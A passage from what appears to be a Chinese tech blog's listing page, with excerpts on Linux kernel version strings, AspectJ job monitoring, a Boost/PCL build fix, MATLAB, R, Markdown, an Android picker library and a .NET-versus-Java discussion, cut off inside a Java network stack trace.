		一、 x86与x86_64
x86、x86_64主要的区别就是32位和64位的问题。
x86 ======&gt; 32位 x86_64 和 x64 以及AMD64 ======&gt; 都是64位
x86是指intel的开发的一种32位指令集，从386开始时代开始的，一直沿用至今，是一种cisc指令集，所有intel早期的cpu，amd早期的cpu都支持这种指令集，ntel官方文档里面称为“IA-32”
x84_64是x86 CPU开始迈向64位的时候，有2选择：1、向下兼容x86。2、完全重新设计指令集，不兼容x86。AMD抢跑了，比Intel率先制造出了商用的兼容x86的CPU，AMD称之为AMD64。而Intel选择了设计一种不兼容x86的全新64为指令集，称之为IA-64，但是比amd晚了一步，因为是全新设计的CPU，没有编译器，也不支持windows、后来不得不在时机落后的情况下也开始支持AMD64的指令集，但是换了个名字，叫x86_64，表示是x86指令集的64扩展，。也就是说实际上，x86_64,x64,AMD64基本上是同一个东西。
二、查看Linux内核信息
[root@localhost ~]# cat /proc/version Linux version 2.6.32-642.el6.x86_64 (mockbuild@worker1.bsys.centos.org) (gcc version 4.4.7 20120313 (Red Hat 4.4.7-17) (GCC) ) #1 SMP Tue May 10 17:27:01 UTC 2016 [root@localhost ~]# uname -r 2.6.32-642.el6.x86_64 [root@localhost ~]# uname -a Linux localhost.localdomain 2.6.32-642.el6.x86_64 #1 SMP Tue May 10 17:27:01 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux uname -r 显示的结果是什么意思? 2.6.32-642.el6.x86_64 2： —-&gt;主版本号 6： —–&gt;次版本号 6 表示稳定版本 32： —–&gt;修订版本号，表示修订次数
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ebe80394c7e9b021a69bec8bd0e07e3c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9bf7b45d81b9eabc603281fd270befe4/" rel="bookmark">
			普通Java项目使用gradle构建时引入Aspectj
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一个普通的Java项目，如果想对某些类织入额外的代码，一个比较好的选择是Aspectj，它对项目的侵入最小，只需要写一个Aspectj的切面文件，然后使用构建工具引入Aspectj的插件（gradle、maven），它就能在编译时织入你想要的代码。
我们项目中有一个使用quartz定时任务的工程，有很多的job，现在想要将这些job监控起来，job执行否？job执行成功否？基本思想是在每个job执行开始记录，执行结束记录，抛异常记录。有两种方案。一种是写一个抽象类，所有的job继承于此类，此类中在job真正执行方法之前之后和抛异常的时候进行处理。
/** * @author xiongshiyan at 2018/3/2 */ public class JobExecute extends Model&lt;JobExecute&gt; { public static final String ID = "id"; public static final String DAY = "day"; public static final String START = "start"; public static final String END = "end"; public static final String JOB_NAME = "jobName"; public static final String IS_SUCCESS_FINISHED = "isSuccessFinished"; public static final int SUCCESS = 1; public static final int FAIL = 0; public static final JobExecute dao = new JobExecute(); /** * job开始的时候记录，说明开始执行了 * @param day 哪一天 * @param start 开始时间 * @param jobName jobName * @return JobExecute 后面更新此model的某些字段 */ public JobExecute insertStart(Date day, Date start, String jobName){ JobExecute execute = new JobExecute(); execute.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9bf7b45d81b9eabc603281fd270befe4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/52ce1aaee2e619c4163bf905bcad1497/" rel="bookmark">
			PCL1.8与boost1.58的依赖问题----------Ubuntu16.04重装PCL1.8笔记
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		给一台电脑重新装了个系统配置了个环境，遇到些问题，搞了半天。
pcl issue有人提交也没有个解决办法。晚上搞了下解决了问题。
（1）问题描述：
../lib/libpcl_recognition.so.1.8.1: undefined reference to `boost::filesystem::path_traits::dispatch(boost::filesystem::directory_entry const&amp;, std::string&amp;)' collect2: error: ld returned 1 exit status tools/CMakeFiles/pcl_train_linemod_template.dir/build.make:147: recipe for target 'bin/pcl_train_linemod_template' failed make[2]: *** [bin/pcl_train_linemod_template] Error 1 （2）原因分析（走过的坑，可略过）：
按照提示是boost的问题，很简单就是为cmakelist设置boost路径：
set(Boost_LIBRARY_DIR /usr/lib/x86_64-linux-gnu/) 然而并没有解决问题，后来换了多个pcl版本，均编译失败。也是同样问题。
（3）解决办法:
后来想到pcl依赖的各种库版本有要求，于是升级boost1.58到boost1.60解决了问题。另外台电脑（Ubuntu16.04+boost1.58）却能编译通过。应该是PCL更新的缘故。
（4）升级boost方法
我们采用源码编译的方式，ubuntu的源也更不到更新的boost。
1删除boost1.58
libboost1.58-all-dev 2下载boost1.60源码
https://sourceforge.net/projects/boost/files/boost-binaries/1.60.0/ 3解压源码并进入目录
4查看需要单独编译模块
./bootstrap.sh --show-libraries 5选择编译模块
./bootstrap.sh --with-libraries= atomic,chrono,container,context,coroutine,coroutine2,date_time,exception,filesystem,graph,graph_parallel,iostreams,locale,with-log,math,metaparse,mpi,program_options,python,random,regex,serialization,signals,system,test,thread,timer,type_erasure,wave 6编译
sudo ./b2 7复制头文件
sudo cp -a stage/lib /usr sudo cp -a boost /usr/include boost升级部分参考
1
2
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ba0055bfbf4a86fb63ea8481f46ca666/" rel="bookmark">
			MATLAB提取矩阵中的一部分
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		MATLAB对矩阵的操作十分灵活，下面对最近遇到的进行总结：
格式A(m,n)，用于提取矩阵A中符合m,n要求的部分
1、提取某个元素，则m,n为数字标量，如A（2,3）为第二行第三列的元素。
2、提取某行某列
A(：，n)提取第n列的所有元素，如A(：，3)提取第三列的所有元素；
A(m，：)提取第m行的所有元素，如A(3，：)提取第三行的所有元素；
3、提取任意的某部分并重新组成新的矩阵，连续或不连续，单调或不单调
数字指定：A([1 2 3 4]，[2 3]) 返回1 2 3 4行2 3 列的数据；
步长指定：A(1:2:end，:) A(2:2:end，:)分别提取矩阵A的奇数行和偶数行数据；
A(end:-1:1，:) A(:，end:-1:1)分别返回A矩阵行倒序和列倒序的矩阵
变量指定：A(B（：，1）,:)，其中B的第一列含有数据，用来指定取矩阵A的哪些行。
4、变量指定，假设一个矩阵X1中存储的是坐标，用矩阵X1的坐标访问矩阵labels_left中对应的元素：
for i = 1:size(X1,1)
x = labels_left(X1(i,2),X1(i,1));%匹配对1在左图中的label数
end
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/51bd766e8c59424c677343b7503ab5d1/" rel="bookmark">
			这可能是史上最好用的PickerView库了
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		从去年开始大概已经有10个月没有更新博客了，去年结婚，也有了个小baby,导致这么长时间没有更新博客，从今天起博客正常更新，一切步入正轨。今天受一个好朋友的重托分享他的一篇文章：这可能是史上最好用的PickerView库了，同时也欢迎大家关注他的简书账号：笨小孩。下面开启“CV”模式！！！
如果你看到了这篇文章，希望你耐心的把它看完。我保证你认真看完了全部，一定不会让你失望。因为你可能遇到了史上最好用的PickerView库。 本文会通过和目前github上最受欢迎的PickerView库做详细的对比，通过对比你可以清晰的感受它的好用和强大。 先来一下github地址方便那些喜欢直接看代码的同志们：https://github.com/jaaksi/pickerview.
一个非常好用的Android PickerView库，内部提供3种常用类型的Picker。支持扩展自定义Picker。
TimePicker：时间选择器，包含日期MixedTimePicker:：聚合的时间选择器OptionPicker：联动选择器 Screenshot MixedTimePicker.gif
custom.png
APK Demo App下载连接
PickerView README
Picker 通过组装PickerView实现常用的Picker选择器。上面已经列举提供的3中常用的Picker。
BasePicker Picker基类：封装了TopBar，PickerView容器，create and add PickerView方法，Picker弹窗等方法。 三种Picker都继承自BasePicker，你也可以继承它扩展自己的Picker。
API apidescriptionsetPickerBackgroundColor设置picker背景setPadding设置PickerView父容器padding 单位:pxsetTag给Picker 设置tag，用于区分不同的picker等。用法同View setTaggetRootLayout获取PickerView的父容器，创建DefaultTopBar时必须指定setOnPickerChooseListener设置picker取消，确定按钮监听。可用于拦截选中操作setTopBar设置自定义TopBarsetInterceptor设置拦截器createPickerView创建PickerViewgetPickerViews获取Picker中所有的pickerview集合addPicker将创建的PickerView 添加到上面集合中，createPickerView内部已调用该方法findPickerViewByTag通过tag找到对应的PickerViewisScrolling是否滚动未停止。滚动未停止的时候，不响应Picker的取消，确定按键getPickerDialog获取Picker弹窗。可以在new之后设置dialog属性show显示picker弹窗 对比github上最受欢迎的同类库 Android-PickerView 本库将TopBar等通用相关逻辑封装在基类中，并提供代码中创建PickerView方法，不需要再依赖xml。用户自定义Picker时，继承BasePicker，只需要处理自己的逻辑即可，简单便捷。 而对Android-PickerView来说，实现自定义Picker，依然需要处理TopBar等逻辑。造成大量重复代码。 TopBar TopBar:TopBar通过抽象接口ITopBar来管理，实现Picker与TopBar的解耦。提供默认实现DefaultTopBar。可实现接口定制自己的TopBar。
public interface ITopBar { /** * @return topbar view */ View getTopBarView(); /** * @return 取消按钮view */ View getBtnCancel(); /** * @return 确定按钮view */ View getBtnConfirm(); /** * @return title view */ TextView getTitleView(); } DefaultTopBar API apidescriptionsetDividerColor设置topbar bottom line colorsetDividerHeight设置bottom divider line heightgetDivider获取TopBar bottom linegetTitleView获取TopBar title view Interceptor 拦截器：用于在pickerview创建时拦截，设置pickerview的属性。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/51bd766e8c59424c677343b7503ab5d1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5811d018c9c7b21e849dd710761e1236/" rel="bookmark">
			HTML5详细学习资料
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		这两天一直在和h5打交道，以下总结一些关于HTML5的资料及如何方便使用
（一）HTML5的原型设计模板平台
1.http://sc.chinaz.com/tag_moban/Html.html
2.http://www.zzfriend.com/xiazai/moban/
3.http://www.smallseashell.com/t/431-48-23/1.html
4.http://www.17sucai.com/pins/27473.html
5.http://www.ke01.com/html5cmsmuban/
6.http://www.ui92.com/down/26.html
7.http://www.jqueryfuns.com/moban-27-0-2
8.http://www.mobanwang.com/mb/201709/15307.html
9.http://www.apppark.cn/apppark/theme/themeStep.jsp?themeId=21&amp;themeVip=0 （二）HTML5的原型设计工具
1.https://modao.cc/
2.https://www.xiaopiu.com/
3.http://doc.mockplus.cn/
目前这三个原型设计工具比较好用一些，并且都可以适用于三端
（三）HTML5的特效聚集网站
chromeexperiments.com Mr.doob
litewerx.showcase
Form FollowsFunction
AlteredQualia
html5rocks.com 的页面
html5tricks 的页面
(四)视觉特效与交互式视频
http://www.thewildernessdowntown.com/
Interactive Film"itsumo kawaii"
http://www.beonlineb.com/
Arcade Fire /Just a Reflektor
Aaronetrope 3D科幻视频投影对话
Aleksandar Rodic 3D立体博客
Beanstalk
http://www.ro.me/
three.js webgl 动态地图
Ô Green bySPECIAL.T 水中植物广告
Kimatica -Creative Connections 树脉
Earth to Echo 电影科幻宣传网站
http://middle-earth.thehobbit.com/map 霍比特人
HelloRun™ 线稿房间，第一人称动
LETTERS, INC. 集成电路
Dataveyes |Human Data Interactions 视觉粒子
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5811d018c9c7b21e849dd710761e1236/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e50413d110a5e709792e38206726d9f2/" rel="bookmark">
			js判断用户refer,platform进行验证,防止作弊
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 为了防止作弊行为特意写了一个小js脚本
var t_refer= ["localhost","baidu.com","qq.com"]; var t_platform = ["Win","Mac"]; var auth_lock ; //判断refer
for(var a in t_refer){ if(refer.indexOf(t_refer[a]) &gt; -1){ //refer 包含 t_refer数组中任意一个 可以执行 auth_lock = true; break; }else{ auth_lock = false; } } //判断设备平台
for(var b in t_platform){ if(!platform.indexOf(t_platform[b]) &gt; -1){ auth_lock = false; break; }else{ //platform 不包含 t_platform数组中人一个 可以执行 auth_lock = true; } } if(auth_lock){ alert(alert_text+" auth_lock = "+auth_lock); }else{ alert("验证未通过!"); } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d5254f002e6699e1d57ce5348e31991c/" rel="bookmark">
			使用R中merge()函数合并数据
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		使用R中merge()函数合并数据 在R中可以使用merge()函数去合并数据框，其强大之处在于在两个不同的数据框中标识共同的列或行。
如何使用merge()获取数据集中交叉部分 merge()最简单的形式为获取两个不同数据框中交叉部分。举例，获取cold.states和large.states完全匹配的数据。代码如下：
&gt; merge(cold.states, large.states) Name Frost Area 1 Alaska 152 566432 2 Colorado 166 103766 3 Montana 155 145587 4 Nevada 188 109889 如果你属性数据库语法SQL,你可能想merge()和数据库中JOIN功能很相似。确实如此，merge()函数的不同参数可以实现内join，left join,right join以及完整join。
merge()函数有很多参数，看起来非常吓人。但他们都几中类型参数有关：
x: 第一个数据框.
y: 第二个数据框.
by, by.x, by.y: 指定两个数据框中匹配列名称。缺省使用两个数据框中相同列名称。
all, all.x, all.y: 指定合并类型的逻辑值。缺省为false，all=FALSE (仅返回匹配的行).
最后一组参数all, all.x, all.y需要进一步解释，决定合并类型。
如何理解不同类型的合并 merge() 函数支持4种类型数据合并:
Natural join: 仅返回两数据框中匹配的数据框行，参数为：all=FALSE.
Full outer join: 返回两数据框中所有行， 参数为： all=TRUE.
Left outer join: 返回x数据框中所有行以及和y数据框中匹配的行，参数为： all.x=TRUE.
Right outer join: 返回y数据框中所有行以及和x数据框匹配的行，参数为： all.y=TRUE.
如何实现完整合并(full outer join) 返回示例数据中美国的州，执行完整合并cold和large state，使用参数all=TRUE.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d5254f002e6699e1d57ce5348e31991c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f2c84a4b26606d63b5af83d78d64e034/" rel="bookmark">
			Markdown 编辑器设置字体大小颜色
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文转自：http://blog.csdn.net/testcs_dn/article/details/45719357
Markdown是一种可以使用普通文本编辑器编写的标记语言，通过类似HTML的标记语法，它可以使普通文本内容具有一定的格式。但是它本身是不支持修改字体、字号与颜色等功能的！
CSDN-markdown编辑器是其衍生版本，扩展了Markdown的功能（如表格、脚注、内嵌HTML等等）！对，就是内嵌HTML，接下来要讲的功能就需要使用内嵌HTML的方法来实现。
字体、字号与颜色 &lt;font face="黑体"&gt;我是黑体字&lt;/font&gt; &lt;font face="微软雅黑"&gt;我是微软雅黑&lt;/font&gt; &lt;font face="STCAIYUN"&gt;我是华文彩云&lt;/font&gt; &lt;font color=#0099ff size=7 face="黑体"&gt;color=#0099ff size=72 face="黑体"&lt;/font&gt; &lt;font color=#00ffff size=72&gt;color=#00ffff&lt;/font&gt; &lt;font color=gray size=72&gt;color=gray&lt;/font&gt; 123456 Size：规定文本的尺寸大小。可能的值：从 1 到 7 的数字。浏览器默认值是 3。
呈现效果 我是黑体字 我是微软雅黑 我是华文彩云 color=#0099ff size=72 face=”黑体” color=#00ffff 可以用十六位颜色值 color=gray 也可以用已知颜色名
颜色名列表 颜色名十六进制颜色值颜色AliceBlue#F0F8FFrgb(240, 248, 255)AntiqueWhite#FAEBD7rgb(250, 235, 215)Aqua#00FFFFrgb(0, 255, 255)Aquamarine#7FFFD4rgb(127, 255, 212)Azure#F0FFFFrgb(240, 255, 255)Beige#F5F5DCrgb(245, 245, 220)Bisque#FFE4C4rgb(255, 228, 196)Black#000000rgb(0, 0, 0)BlanchedAlmond#FFEBCDrgb(255, 235, 205)Blue#0000FFrgb(0, 0, 255)BlueViolet#8A2BE2rgb(138, 43, 226)Brown#A52A2Argb(165, 42, 42)BurlyWood#DEB887rgb(222, 184, 135)CadetBlue#5F9EA0rgb(95, 158, 160)Chartreuse#7FFF00rgb(127, 255, 0)Chocolate#D2691Ergb(210, 105, 30)Coral#FF7F50rgb(255, 127, 80)CornflowerBlue#6495EDrgb(100, 149, 237)Cornsilk#FFF8DCrgb(255, 248, 220)Crimson#DC143Crgb(220, 20, 60)Cyan#00FFFFrgb(0, 255, 255)DarkBlue#00008Brgb(0, 0, 139)DarkCyan#008B8Brgb(0, 139, 139)DarkGoldenRod#B8860Brgb(184, 134, 11)DarkGray#A9A9A9rgb(169, 169, 169)DarkGreen#006400rgb(0, 100, 0)DarkKhaki#BDB76Brgb(189, 183, 107)DarkMagenta#8B008Brgb(139, 0, 139)DarkOliveGreen#556B2Frgb(85, 107, 47)Darkorange#FF8C00rgb(255, 140, 0)DarkOrchid#9932CCrgb(153, 50, 204)DarkRed#8B0000rgb(139, 0, 0)DarkSalmon#E9967Argb(233, 150, 122)DarkSeaGreen#8FBC8Frgb(143, 188, 143)DarkSlateBlue#483D8Brgb(72, 61, 139)DarkSlateGray#2F4F4Frgb(47, 79, 79)DarkTurquoise#00CED1rgb(0, 206, 209)DarkViolet#9400D3rgb(148, 0, 211)DeepPink#FF1493rgb(255, 20, 147)DeepSkyBlue#00BFFFrgb(0, 191, 255)DimGray#696969rgb(105, 105, 105)DodgerBlue#1E90FFrgb(30, 144, 255)Feldspar#D19275rgb(209, 146, 117)FireBrick#B22222rgb(178, 34, 34)FloralWhite#FFFAF0rgb(255, 250, 240)ForestGreen#228B22rgb(34, 139, 34)Fuchsia#FF00FFrgb(255, 0, 255)Gainsboro#DCDCDCrgb(220, 220, 220)GhostWhite#F8F8FFrgb(248, 248, 255)Gold#FFD700rgb(255, 215, 0)GoldenRod#DAA520rgb(218, 165, 32)Gray#808080rgb(128, 128, 128)Green#008000rgb(0, 128, 0)GreenYellow#ADFF2Frgb(173, 255, 47)HoneyDew#F0FFF0rgb(240, 255, 240)HotPink#FF69B4rgb(255, 105, 180)IndianRed#CD5C5Crgb(205, 92, 92)Indigo#4B0082rgb(75, 0, 130)Ivory#FFFFF0rgb(255, 255, 240)Khaki#F0E68Crgb(240, 230, 140)Lavender#E6E6FArgb(230, 230, 250)LavenderBlush#FFF0F5rgb(255, 240, 245)LawnGreen#7CFC00rgb(124, 252, 0)LemonChiffon#FFFACDrgb(255, 250, 205)LightBlue#ADD8E6rgb(173, 216, 230)LightCoral#F08080rgb(240, 128, 128)LightCyan#E0FFFFrgb(224, 255, 255)LightGoldenRodYellow#FAFAD2rgb(250, 250, 210)LightGrey#D3D3D3rgb(211, 211, 211)LightGreen#90EE90rgb(144, 238, 144)LightPink#FFB6C1rgb(255, 182, 193)LightSalmon#FFA07Argb(255, 160, 122)LightSeaGreen#20B2AArgb(32, 178, 170)LightSkyBlue#87CEFArgb(135, 206, 250)LightSlateBlue#8470FFrgb(132, 112, 255)LightSlateGray#778899rgb(119, 136, 153)LightSteelBlue#B0C4DErgb(176, 196, 222)LightYellow#FFFFE0rgb(255, 255, 224)Lime#00FF00rgb(0, 255, 0)LimeGreen#32CD32rgb(50, 205, 50)Linen#FAF0E6rgb(250, 240, 230)Magenta#FF00FFrgb(255, 0, 255)Maroon#800000rgb(128, 0, 0)MediumAquaMarine#66CDAArgb(102, 205, 170)MediumBlue#0000CDrgb(0, 0, 205)MediumOrchid#BA55D3rgb(186, 85, 211)MediumPurple#9370D8rgb(147, 112, 216)MediumSeaGreen#3CB371rgb(60, 179, 113)MediumSlateBlue#7B68EErgb(123, 104, 238)MediumSpringGreen#00FA9Argb(0, 250, 154)MediumTurquoise#48D1CCrgb(72, 209, 204)MediumVioletRed#C71585rgb(199, 21, 133)MidnightBlue#191970rgb(25, 25, 112)MintCream#F5FFFArgb(245, 255, 250)MistyRose#FFE4E1rgb(255, 228, 225)Moccasin#FFE4B5rgb(255, 228, 181)NavajoWhite#FFDEADrgb(255, 222, 173)Navy#000080rgb(0, 0, 128)OldLace#FDF5E6rgb(253, 245, 230)Olive#808000rgb(128, 128, 0)OliveDrab#6B8E23rgb(107, 142, 35)Orange#FFA500rgb(255, 165, 0)OrangeRed#FF4500rgb(255, 69, 0)Orchid#DA70D6rgb(218, 112, 214)PaleGoldenRod#EEE8AArgb(238, 232, 170)PaleGreen#98FB98rgb(152, 251, 152)PaleTurquoise#AFEEEErgb(175, 238, 238)PaleVioletRed#D87093rgb(216, 112, 147)PapayaWhip#FFEFD5rgb(255, 239, 213)PeachPuff#FFDAB9rgb(255, 218, 185)Peru#CD853Frgb(205, 133, 63)Pink#FFC0CBrgb(255, 192, 203)Plum#DDA0DDrgb(221, 160, 221)PowderBlue#B0E0E6rgb(176, 224, 230)Purple#800080rgb(128, 0, 128)Red#FF0000rgb(255, 0, 0)RosyBrown#BC8F8Frgb(188, 143, 143)RoyalBlue#4169E1rgb(65, 105, 225)SaddleBrown#8B4513rgb(139, 69, 19)Salmon#FA8072rgb(250, 128, 114)SandyBrown#F4A460rgb(244, 164, 96)SeaGreen#2E8B57rgb(46, 139, 87)SeaShell#FFF5EErgb(255, 245, 238)Sienna#A0522Drgb(160, 82, 45)Silver#C0C0C0rgb(192, 192, 192)SkyBlue#87CEEBrgb(135, 206, 235)SlateBlue#6A5ACDrgb(106, 90, 205)SlateGray#708090rgb(112, 128, 144)Snow#FFFAFArgb(255, 250, 250)SpringGreen#00FF7Frgb(0, 255, 127)SteelBlue#4682B4rgb(70, 130, 180)Tan#D2B48Crgb(210, 180, 140)Teal#008080rgb(0, 128, 128)Thistle#D8BFD8rgb(216, 191, 216)Tomato#FF6347rgb(255, 99, 71)Turquoise#40E0D0rgb(64, 224, 208)Violet#EE82EErgb(238, 130, 238)VioletRed#D02090rgb(208, 32, 144)Wheat#F5DEB3rgb(245, 222, 179)White#FFFFFFrgb(255, 255, 255)WhiteSmoke#F5F5F5rgb(245, 245, 245)Yellow#FFFF00rgb(255, 255, 0)YellowGreen#9ACD32rgb(154, 205, 50) &lt;link rel="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f2c84a4b26606d63b5af83d78d64e034/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/64810a24543c87ea45e419a6a05243e1/" rel="bookmark">
			MUI 页面跳转、传参与刷新
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		MUI教程 教程地址：http://www.hcoder.net/course/info_211.html
一、页面跳转 初始化时创建子页面 mui.init({ subpages: [{ url: your - subpage - url, //子页面HTML地址，支持本地地址和网络地址 id: your - subpage - id, //子页面标志 styles: { top: subpage - top - position, //子页面顶部位置 bottom: subpage - bottom - position, //子页面底部位置 width: subpage - width, //子页面宽度，默认为100% height: subpage - height, //子页面高度，默认为100% ...... }, extras: {} //额外扩展参数 }] }); 直接打开新页面 MUI封装了自己的页面打开的方法
mui.openWindow({ url: new - page - url, id: new - page - id, styles: { top: newpage - top - position, //新页面顶部位置 bottom: newage - bottom - position, //新页面底部位置 width: newpage - width, //新页面宽度，默认为100% height: newpage - height, //新页面高度，默认为100% .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/64810a24543c87ea45e419a6a05243e1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/070a0b01c0697fd75eec5fce767b1510/" rel="bookmark">
			国内大型公司，京东，携程从c &amp;.net转型java的原因有哪些？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题： 为什么京东、携程放弃了c#&amp;.net而转型java，这其中的原因究竟有哪些呢？
我想到的原因有以下几点：
1. 开源语言，免费，相关产品不用花钱，微软的产品一年会花费多少？
2. 开源插件会很多，可替代性强
3. 移动端火，安卓占据很大一部分
由于使用Java 语言， 绝大多数程序员在理解了Map/Reduce , 分布式文件系统在Hadoop中的实现以后， 很快就能编写处理处理海量数据的程序，从而大大的提升工作效率。
更是 一个名叫Android 的系统横空出世， 并且随着移动互联网的爆发迅速普及， 运行在Android之上的正是Java ！
下面就让我们深入分析一下两者的优点和缺点。
两者都有太多的优点和缺点。冒着被喷的风险，简单的说下吧。
C# .NET的优点
1.从使用者角度来看，语言层面C#是领先Java的。C#最初设计可能借鉴了Java，可谓“青出于蓝而胜于蓝”吧。这点，C#很多的语法糖就可以说明。至于平台层面，CLR是否一定优于JVM，这个没有透彻研究，不敢轻易下结论。
2.微软拥有号称世界上最强大的IDE工具VS，编写C#非常愉快。
3.微软作为一家商用公司，一贯是比较体贴开发者。制定好各种标准和实现，版本兼容性那些也做的很好。加上2中提到的IDE强大。易用性是更加好的（至少对于初学者是这样）。同时，微软的很多技术让编程的门槛更低（例如早几年搞的拖控件，绑数据...堪称是“傻瓜式”的）。在一些小公司，或者一些要求不高的项目，这种开发技术可能比较有优势。
4.跨平台游戏引擎支持。跨平台APP开发的支持。
夸了那么多，优点就不往下展开，泼下冷水：
1.由于早年不开源，且捆绑windows紧密，所以跨平台特性被人诟病。虽然Mono崛起，并且开源了，但是很难改掉人们对微软“封闭、臃肿、不安全”的印象了。很多人对Mono也是半信半疑。
世上很多事情就是这样的，也算是一种恶性循环吧
2.开源生态确实不如Java，虽然是在努力追赶，但是很多方面还有很大差距。成熟方案和选择性相对少。很多框架和组件，是先在Java平台上出现，后来移植到.NET，更新维护都成问题。很多优秀的中间件、平台，在开发API的时候，都是优先支持Java、python这些，后支持C#（好在大部分的都还支持C#，要不然真的只能靠微软官方去造了）
3.招聘难度大。受国内这种不良风气和环境影响，高端的.NET开发确实特别的少
4.从身边的例子和一些招聘信息来看，相同工作年限、级别的.net程序员的薪资水平应该是略低于Java的（具体的也要看公司和行业，而且人的技术水平、背景、综合能力那些不同，很难横向比较）。这点对一般的开发人员热情来讲是比较有打击性的。当然，高端的技术人员不管是哪个方向和领域，薪资都不会低的
5.由于目前很多企业和个人对Mono和Linux .NET还是半信半疑甚至毫不知情，所以还是会捆绑在windows上。这就造成了授权费用的风险。还有就是windows自动化运维的缺点了。
（为了避免口水战，特别说明：上面说到的几点，有些是客观存在的事实，有些确实是国内的不良风气、误解等造成的恶性循环）
再说说Java的优势：
1.问世早，跨平台，很早就占领了市场，名声已经在那里
2.开源生态好，技术方案的可选性多。良性循环
3.成功的案例多。从企业级系统，到大规模互联网系统，再到现在一直占主流。最后扯到最近几年火热的android、hadoop...可以看出java的地位了
4.由于1，2，3的优点。所以Java高端技术人员相对也会多一些
泼下冷水：
1.语言层面不如后来的C#，很多应用场合下也不如新型的go或者scala之类的
2.易用性不如C#.NET。平台入门的门槛高一些
（见过一些开发人员，配置个环境变量就摸索了半天。有些被微软惯坏了的.NET开发人员，再去开发java，框架整合和一大堆的配置文件就可能弄个半死）
3.IDE不如VS好用（也和个人习惯有关，各有千秋吧）
Eclipse的最大优势在于灵活、可扩展、占用资源少
而myeclipse貌似很少有人在用了
IDEA还不错，不过感觉离微软的VS还是有差距
4.java的母公司sun被Oracle收购后，总让人感觉不太踏实
5.别总抱怨说微软的某些体系和标准臃肿，反人类。其实JavaEE体系里也有很多不成功的设计标准（EJB JPA JSF那些使用并不广泛），
只不过后来都被轻量级的开源框架取代了
说了那么多，大概都明白要迁移的理由了。理性的理由大概如下：
1.对Mono和.NET跨平台不太了解，捆绑在windows上面了。因此又担心IDE和服务器费用问题，又担心windows的安全性、自动化运维不方便。而Java跨平台特性早就为人所知。
2.看到.NET开源生态不是很好，Java成功的案例多，开源的方案选择性更多
3.Java的高端技术大牛好像要容易找一点，至少国内是这样的（很多大厂用Java，企业会认为Java大牛多）
4.暂时也找不出其他理由了
总结 到这里，国内大型公司，京东，携程从c#&amp;.net转型java的原因有哪些就结束了，，不足之处还望大家多多包涵！！觉得收获的话可以点个关注收藏转发一波喔，谢谢大佬们支持。（吹一波，233~~）
下面和大家交流几点编程的经验：
1、多写多敲代码，好的代码与扎实的基础知识一定是实践出来的
2丶 测试、测试再测试，如果你不彻底测试自己的代码，那恐怕你开发的就不只是代码，可能还会声名狼藉。
3丶 简化算法，代码如恶魔，在你完成编码后，应回头并且优化它。从长远来看，这里或那里一些的改进，会让后来的支持人员更加轻松。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/070a0b01c0697fd75eec5fce767b1510/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/068f08f32c2014fae1d1da75b442439a/" rel="bookmark">
			java.net.NoRouteToHostException: No route to host
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		02-28 14:38:49.626 5624-5624/com.moreunion.zhenghao W/System.err: java.net.NoRouteToHostException: No route to host 02-28 14:38:49.629 5624-5624/com.moreunion.zhenghao W/System.err: at java.net.PlainSocketImpl.socketConnect(Native Method) 02-28 14:38:49.629 5624-5624/com.moreunion.zhenghao W/System.err: at java.net.AbstractPlainSocketImpl.doConnect(AbstractPlainSocketImpl.java:334) 02-28 14:38:49.640 5624-5624/com.moreunion.zhenghao W/System.err: at java.net.AbstractPlainSocketImpl.connectToAddress(AbstractPlainSocketImpl.java:196) 02-28 14:38:49.641 5624-5624/com.moreunion.zhenghao W/System.err: at java.net.AbstractPlainSocketImpl.connect(AbstractPlainSocketImpl.java:178) 02-28 14:38:49.641 5624-5624/com.moreunion.zhenghao W/System.err: at java.net.SocksSocketImpl.connect(SocksSocketImpl.java:356) 02-28 14:38:49.641 5624-5624/com.moreunion.zhenghao W/System.err: at java.net.Socket.connect(Socket.java:592) 02-28 